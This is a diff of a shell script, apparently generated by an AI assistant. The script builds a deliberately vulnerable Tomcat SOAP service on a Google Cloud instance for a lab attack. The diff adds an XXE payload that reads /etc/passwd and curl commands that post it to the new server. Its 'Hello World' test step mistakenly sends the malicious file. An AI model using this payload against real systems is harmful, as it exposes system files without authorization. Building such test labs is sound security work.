@@ -6,6 +6,21 @@ Certainly! Below is a shell script (`setup_complex_server.sh`) that creates a Go
 mkdir attack-4-tomcat
 cd attack-4-tomcat
 
+# Solution Files
+cat <<'EOF' > simple.xml
+<?xml version="1.0" encoding="UTF-8"?>
+<root>Hello World</root>
+EOF
+
+cat <<'EOF' > malicious.xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ELEMENT root ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
+]>
+<root>&xxe;</root>
+EOF
+
 # Create the startup script
 cat <<'EOF' > startup-script.sh
 #!/bin/bash
@@ -91,20 +106,20 @@ sudo chown -R tomcat:tomcat /var/lib/tomcat9/webapps/ROOT
 # Restart Tomcat
 sudo systemctl restart tomcat9
 EOF
-cd ..
 
-# Create the Google Cloud instance with the startup script
+# Create the instance with automatic deletion after 1 hour
 # gcloud compute instances create "attack-4-tomcat" \
 #   --zone "asia-south2-a" \
 #   --machine-type "c2-standard-4" \
 #   --image-family "ubuntu-2004-lts" \
 #   --image-project "ubuntu-os-cloud" \
 #   --boot-disk-size "10GB" \
-#   --tags "attack-4-tomcat" \
-#   --metadata-from-file startup-script=startup-script.sh
+#   --tags "http-server,https-server,lb-health-check,attack-4-tomcat" \
+#   --metadata-from-file startup-script=attack-4-tomcat/startup-script.sh \
+#   --metadata google-compute-default-timeout=600  
 
-# Create the instance with automatic deletion after 1 hour
-gcloud compute instances create "attack-4-tomcat" \
+# Create the instance and extract the external IP
+eip=$(gcloud compute instances create "attack-4-tomcat" \
   --zone "asia-south2-a" \
   --machine-type "c2-standard-4" \
   --image-family "ubuntu-2004-lts" \
@@ -113,15 +128,19 @@ gcloud compute instances create "attack-4-tomcat" \
   --tags "http-server,https-server,lb-health-check,attack-4-tomcat" \
   --metadata-from-file startup-script=startup-script.sh \
   --metadata google-compute-default-timeout=600 \
-  --deletion-protection=false
+  --format="get(networkInterfaces[0].accessConfigs[0].natIP)")
 
-# # Configure firewall to allow traffic only on ports 80 and 443
-# gcloud compute firewall-rules create "allow-http-https" \
-#   --allow tcp:80,tcp:443 \
-#   --target-tags "attack-4-tomcat" \
-#   --direction INGRESS
+echo "Waiting 2.5 minutes for server to setup. Then starting testing the vulnerability."
 
-echo "Wait 5 minutes for server to setup. Then start testing the vulnerability."
+sleep 150
+
+echo "Testing with Hello World \n"
+curl -X POST -H "Content-Type: application/xml" --data @malicious.xml http://$eip/SOAPService
+
+sleep 5
+
+echo "\n Fetching contents of etc/passwd file\n"
+curl -X POST -H "Content-Type: application/xml" --data @malicious.xml http://$eip/SOAPService
 ```
 
 ---
